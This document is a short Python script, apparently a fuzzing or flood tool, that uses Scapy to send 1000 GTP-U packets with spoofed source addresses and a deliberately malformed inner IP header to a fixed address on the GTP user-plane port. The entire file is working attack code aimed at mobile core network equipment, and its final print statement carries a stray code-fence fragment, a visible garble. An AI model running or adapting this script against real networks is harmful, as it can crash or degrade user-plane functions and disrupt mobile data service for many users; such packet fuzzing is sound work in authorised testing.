#!/usr/bin/env python3
from scapy.all import IP, UDP, send
from scapy.contrib.gtp import GTPHeader
import random
import time

def random_ip():
    first_octet = 10
    return f"{first_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def send_malformed_packet():
    # Craft a GTP-U packet with a corrupted inner IP packet
    inner_ip = IP(version=5, src="192.168.1.1", dst="8.8.8.8", chksum=0xFFFF)  # Invalid version and checksum
    pkt = (
        IP(src=random_ip(), dst="10.42.0.64") /
        UDP(sport=2152, dport=2152) /
        GTPHeader(version=1, PT=1, gtp_type=1, teid=12345) /
        inner_ip /
        UDP(sport=12345, dport=54321)
    )
    return pkt

# Send packets in a loop
packet_count = 0
max_packets = 1000
inter = 0.0002

while packet_count < max_packets:
    pkt = send_malformed_packet()
    send(pkt, count=1, verbose=1)
    packet_count += 1
    time.sleep(inter)

print(f"Sent {packet_count} malformed```python GTP-U packets.")